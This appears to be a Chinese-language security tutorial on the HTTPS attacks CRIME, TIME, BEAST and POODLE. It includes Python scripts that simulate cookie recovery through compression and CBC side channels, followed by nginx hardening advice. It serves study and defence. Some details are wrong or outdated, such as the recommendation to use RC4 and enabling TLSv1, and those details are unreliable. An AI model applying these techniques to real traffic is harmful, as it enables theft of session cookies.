# 常见的HTTPS攻击方法

0x00 背景
=======

* * *

研究常见的https攻击方法

Beast crime breach，并针对https的特性提出一些安全部署https的建议。

针对于HTTPS的攻击，多存在于中间人攻击的环境中，主要是针对于HTTPS所使用的压缩算法和CBC加密模式，进行side-channel-attack。这几类攻击的前置条件都比较苛刻，且都需要受害主机提交很多次请求来收集破译关键数据的足够信息。

常见的攻击方法，主要有，BEAST Lucky-13 RC4 Biases CRIME TIME BREACH等。主要对其中三中进行介绍。

0x01 CRIME
==========

* * *

> Compression Ratio Info-leak Made Easy

攻击原理
----

攻击者控制受害者发送大量请求，利用压缩算法的机制猜测请求中的关键信息，根据response长度判断请求是否成功。

如下面的https头，攻击这可以控制的部分为get请求地址，想要猜测的部分为Cookie。那么攻击者只需要在GET地址处，不断变换猜测字符串，进行猜测。

```
GET /sessionid=a HTTP/1.1
Host: bank.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) 
Gecko/20100101 Firefox/16.0
Cookie: sessionid=d3b0c44298fc1c149afbf4c8996fb924

GET /sessionid=a HTTP/1.1
Host: bank.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0)
Gecko/20100101 Firefox/16.0
Cookie: sessionid=d3b0c44298fc1c149afbf4c8996fb924

```

比如上面的情况Response长度为 1000byte。

```
GET /sessionid=d HTTP/1.1
Host: bank.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0)
Gecko/20100101 Firefox/16.0
Cookie: sessionid=d3b0c44298fc1c149afbf4c8996fb924

```

当攻击者猜对了cookie的第一个字母，Response的长度会缩小到9999byte。

当Response被SSL加密之后，如果使用RC4加密模式，长度并不会发生随机改变。使用BCB加密模式时，因为padding的原因，长度会有略微的改变。

受影响的加密算法
--------

```
Deflate = LZ77 + HuffMan
GZip = Headers + Data Compressed using Deflate

```

攻击前提
----

攻击者可以获取受害者的网络通信包。(中间人攻击，ISP供应商)

浏览器和服务器支持均支持并使用压缩算法。

攻击这可以控制受害者发送大量请求并可以控制请求内容。

防御方法
----

客户端可以升级浏览器来避免这种攻击。

```
• Chrome: 21.0.1180.89 and above
• Firefox: 15.0.1 and above
• Opera: 12.01 and above
• Safari: 5.1.7 and above

```

服务器端可以通过禁用一些加密算法来防止此类攻击。

Apache

• SSLCompression flag = “SSLCompression off”

• GnuTLSPriorities flag = “!COMP-DEFLATE"

禁止过于频繁的请求。

修改压缩算法流程，用户输入的数据不进行压缩。

随机添加长度不定的垃圾数据。

影响范围

```
TLS 1.0.
SPDY protocol (Google).
Applications that uses TLS compression.
Mozilla Firefox (older versions) that support SPDY.
Google Chrome (older versions) that supported both TLS and SPDY.

```

POC
---

这个poc并不是模拟真实环境下的中间人攻击，只是在python中利用CRIME的思想验证了攻击的可行性。

```
import string
import zlib
import sys
import random
 
charset = string.letters + string.digits
 
COOKIE = ''.join(random.choice(charset) for x in range(30))
 
HEADERS = ("POST / HTTP/1.1\r\n"
           "Host: thebankserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
           "Accept: */*\r\n"
           "Referer: https://thebankserver.com/\r\n"
           "Cookie: secret="+COOKIE+"\r\n"
           "Accept-Encoding: gzip,deflate,sdch\r\n"
           "Accept-Language: en-US,en;q=0.8\r\n"
           "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
           "\r\n")
BODY =    ("POST / HTTP/1.1\r\n"
           "Host: thebankserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
           "Accept: */*\r\n"
           "Referer: https://thebankserver.com/\r\n"
           "Cookie: secret=")
cookie = ""
 
def compress(data):
 
    c = zlib.compressobj()
    return c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)
def getposset(perchar,chars):
    posset = []
    baselen = len(compress(HEADERS+perchar))
    for i in chars:
        t = len(compress(HEADERS+ perchar+i))
        if (t<=baselen):
            posset += i
    return posset
def doguess():
    global cookie
    while len(cookie)<30:
        posset = getposset(BODY+cookie,charset)
        trun = 1
        tem_posset = posset
        while 1<len(posset):
            tem_body = BODY[trun:]
            posset = getposset(tem_body+cookie,tem_posset)
            trun = trun +1
        if len(posset)==0:
            return False
        cookie += posset[0]
        print posset[0]
        return True
 
while BODY.find("\r\n")>=0:
    if not doguess():
        print "(-)Changebody"
        BODY = BODY[BODY.find("\r\n") + 2:]
print "(+)orign  cookie"+COOKIE
print "(+)Gotten cookie"+cookie

```

0x02 TIME
=========

* * *

> Timing Info-leak Made Easy

攻击原理
----

攻击者控制受害者发送大量请求，利用压缩算法的机制猜测请求中的关键信息，根据response响应时间判断请求是否成功。其实TIME和CRIME一样都利用了压缩算法，只不过CRIME是通过长度信息作为辅助，而TIME是通过时间信息作为辅助。

   Unable to render embedded object: File (1.jpg) not found.

如上图当数据长度，大于MTU时会截断为两个包发送，这样就会产生较大的相应时间差异。攻击者吧包长控制在MTU左右，不断尝试猜测COOKIE。  Unable to render embedded object: File (QQ图片20140724174303.jpg) not found.

如上图所示，我们通过添加Padding来吧数据包大小增加到和MTU相等，Case 1中我们添加的extraByte和需要猜测的数据重合，因为压缩算法的原因，并不会增加包的长度，而Case 2中extraByte和需要猜测的数据并不一致，导致了分包。攻击这可以通过响应时间的不同来区分Case1 Case2两种情况。

攻击前提
----

攻击这可以控制受害者发送大量请求并可以控制请求内容。

稳定的网络环境。

防御方法
----

在解密Response过程中加入随机的短时间延迟。

阻止短时间内的频繁请求。

0x03 BEAST
==========

* * *

> Browser Exploit Against SSL/TLS

攻击原理
----

攻击者控制受害者发送大量请求，利用CBC加密模式猜测关键信息。

CBC模式工作的方法是当加密第i块的时候，和第i-1块的密文异或。更正式地表达如下：

Ci= E(Key, Ci-1 ⊕ Mi)

很显然，当你加密第一块的时候，没有前一块的密文和它异或，因此，标准的做法是产生一个随机的初始化向量（IV），并且用它和第一块明文异或。第一块M0的加密如下:

C0= E(Key, IV ⊕ M0).

然后，接着第一块M1加密如下：

C1= E(Key, C0 ⊕ M1).

现在，除非C0 碰巧和IV一样（这是非常不可能的），那么，即使M0 = M1，对于加密函数来说，两个输入是不同的，因此，C0≠ C1。 CBC有两种的基本的使用方法：

          1.        对于每条记录都认为是独立的；为每一个记录产生一个IV

          2.        把所有的记录当作一个链接在一起的大对象，并且在记录之间继续使用CBC的状态。这意味着最后一条记录n的IV是n-1条记录的密文。

SSLV3和TLS1.0选择的是第二个用法。这好像本来就是个错误

CBC有两种的基本的使用方法：

 1. 对于每条记录都认为是独立的；为每一个记录产生一个IV

 2. 把所有的记录当作一个链接在一起的大对象，并且在记录之间继续使用CBC的状态。这意味着最后一条记录n的IV是n-1条记录的密文。

SSL 3.0和TLS1.0选择的是第二个用法。因此产生了加密算法的安全问题。

攻击者可以把想要猜测的数据段替换掉成：

X ⊕ Ci-1 ⊕ P

当这个注入的内容被加密，X会被异或，结果传给加密算法的明文块如下：

Ci-1 ⊕ P

如果P==Mi ， 新的密文块将和Ci一样，这意味着，你的猜测是正确的。

攻击前提
----

攻击者可以获取受害者的网络通信包。(中间人攻击，ISP供应商)

攻击者需要能得到发送敏感数据端的一部分权限。以便将自己的信息插入SSL/TLS会话中。

攻击者需要准确的找出敏感数据的密文段。

攻击这可以控制受害者发送大量请求并可以控制请求内容。

防御方法
----

使用RC4加密模式代替BCB加密模式。

部署TLS 1.1或者更高级的版本，来避免SSL 3.0/TLS 1.0带来的安全问题。

在服务端设置每传输固定字节，就改变一次加密秘钥。

影响范围

```
TLS 1.0.
SPDY protocol (Google).
Applications that uses TLS compression.
Mozilla Firefox (older versions) that support SPDY.
Google Chrome (older versions) that supported both TLS and SPDY.

```

POC
---

仅在python上模拟了攻击思想的实现，编码中只实现了第一个字母的猜测。

```
import sys
import string
import random
from Crypto.Cipher import AES
 
key = 'lyp62/22Sh2RlXJF'
mode = AES.MODE_CBC
vi = '1234567812345678'
charset = string.letters + string.digits
cookie = ''.join(random.choice(charset) for x in range(30))
HEADERS = ("POST / HTTP/1.1\r\n"
           "Host: thebankserver.com\r\n"
           "Connection: keep-alive\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
           "Accept: */*\r\n"
           "Referer: https://thebankserver.com/\r\n"
           "Cookie: secret="+cookie+"\r\n"
           "Accept-Encoding: gzip,deflate,sdch\r\n"
           "Accept-Language: en-US,en;q=0.8\r\n"
           "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
           "\r\n")
global pad_num
def add_padding(plaintext):
    global pad_num
    pad_num = 16 - len(plaintext) % 16
    for i in range(0,pad_num):
        plaintext += chr(pad_num)
    return plaintext
def check_padding(plaintext):
    global pad_num
    for i in range(1,pad_num+1):
        if (plaintext[-i]!=chr(pad_num)):
            return False
    return True
 
def encrypto(plaintext):
    global pad_num
    obj = AES.new(key,mode,vi)
    if (len(plaintext) % 16):
        plaintext = add_padding(plaintext)
    else:
        pad_num=0
    ciphertext = obj.encrypt(plaintext)
    if (check_padding(ciphertext)):
        return ciphertext
    else:
        return 0
 
def decrypto(ciphertext):
    obj = AES.new(key,mode,vi)
    plaintext = obj.decrypt(ciphertext)
    return plaintext
 
def findcookie():
    global HEADERS
    return HEADERS.find('secret=')+7
 
guess_cookie=''
pos_cookie=findcookie()
pos_block_s = pos_cookie + 16 - pos_cookie%16
HEADERS = HEADERS[:pos_cookie] + (16 - pos_cookie % 16 + 15)*'a' +HEADERS[pos_cookie:]
encry_head = encrypto(add_padding(HEADERS))
per_per_block = encry_head[pos_block_s - 16:pos_block_s]   #Ci-1
per_block = encry_head[pos_block_s:pos_block_s+16]         #x
aft_block = encry_head[pos_block_s+16:pos_block_s+32]      #Ci+1
for i in charset:
    guess_block = 'a' * 15 + i
    insert_block = ''.join(chr(ord(a) ^ ord(b) ^ ord(c)) for a,b,c in zip(per_block,per_per_block,guess_block))
    temp_header = HEADERS[:pos_block_s+16] + insert_block + HEADERS[pos_block_s+16:]
    encry_temp_header = encrypto(add_padding(temp_header))
    if (aft_block == encry_temp_header[pos_block_s+32:pos_block_s+48]):
        print "(+)first byte is:"+i
print "(+)orign cookie:"+cookie

```

攻击者首先使用降级攻击，来让浏览器使用ssl v3.0，再通过ssl v3.0 CBC-mode 存在的缺陷，窃取到用户传输的明文。

0x04 POODLE
===========

* * *

降级攻击

ssl v3.0是一个存在了很久的协议了，现在大多数浏览器为了兼容性都会支持这个协议，但是并不会首先使用这个协议，中间人攻击者可以驳回浏览器协商高版本协议的请求，只放行ssl v3.0协议。

Padding Oracle攻击
----------------

针对于CBC的攻击之前已经有一些了，比如，Beast，Lucky17之类的，详细可以看这里

首先来看CBC-mod的加解密流程。

![enter image description here](http://drops.javaweb.org/uploads/images/6e3c842b68a50ef5f6fbdbd55bc8a9af64c0a732.jpg)

解密流程

![enter image description here](http://drops.javaweb.org/uploads/images/df6e6f9ce55cf7535523aba5a8af8a5f7013f2c4.jpg)

加密流程

![enter image description here](http://drops.javaweb.org/uploads/images/b0939a82545675e520fe5b0871532982dfccca3c.jpg)

校验流程
----

MAC1 = hash(明文) 

密文 = Encode(明文+MAC1+Padding,K)   明文 = Decode(密文，k) - MAC1-Padding(padding的长度由最后一个字节标识)

MAC2 = hash(明文)   如果 MAC1 == MAC2 则校验成功 否则失败

知二求三
----

Padding Oracle 攻击一般都会满足一个知二求三的规律，如下图

 (1) VI    

(2) 解密后的数据，叫它 midText把  

(3) Plaintext    

这三个值我们得到其中两个就可以推出另外一个，因为他们在一起Xor了嘛。

http://drops.wooyun.org/wp-content/uploads/2014/12/file0004.jpg

在Poodle攻击中，我们会把最后一个数据块替换成我们想要猜测的数据块。如下图所示。

![enter image description here](http://drops.javaweb.org/uploads/images/e1c563dc741ec283ce638f28c68c1668b80c5b08.jpg)

这样导致的直接后果就是，CBC完整性验证失败，数据包被驳回。我们假设最后一个数据块均为padding组成(其实我们可以通过控制包的长度来达到这一目的，比如增加path的长度)

那么当且仅当Plaintext[7] == 7(block为16为时为15) 的时候CBC完整性校验才会通过。如果不为7，多删或者少删的padding，都会影响到MAC的正确取值，从而导致校验失败。

那么，我们只需要不断地更改(1) IV 最后一位的值 ，直到(3) Plaintext最后一位为 7 (CBC验证通过)的时候，我们就可以推出 (2) mid text 的最后一位。

| _POODLE_ | _BEAST_ | _Lucky-13_ | _RC4 Biases_ |
| --- | --- | --- | --- |
| Padding Oracle On Downgraded Legacy Encryption | text-base-side-channel-attack | time-base-side-channel-attack | time-base-side-channel-attack |
| 低版本SSL，中间人，大量数据包,BCB模式 | 低版本SSL，中间人，大量数据包，发送内容可控，BCB模式 | 响应时间，大量数据报，发送内容可控 | 响应时间，大量数据报，发送内容可控，RC4模式  |

0x05 安全配置建议
-----------

* * *

此处的安全配置以nginx为例，主要在Nginx.conf中配置。

使用较为安全的SSL加密协议。

```
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;

```

使用严格的加密方法设置。

```
ssl_ciphers 'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:DES-CBC3-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!CAMELLIA:!DES:!MD5:!PSK:!RC4';

```

优先依赖服务器密码。

```
ssl_prefer_server_ciphers on;

```

启用HSTS协议。

```
add_header Strict-Transport-Security max-age=15768000;

```

重定向的配置

```
server {
    listen 80;
    add_header Strict-Transport-Security max-age=15768000;
    return 301 https://www.yourwebsite.com$request_uri;
}

```

使用2048位的数字证书

```
openssl dhparam -out dhparam.pem 2048
ssl_dhparam /path/to/dhparam.pem;
```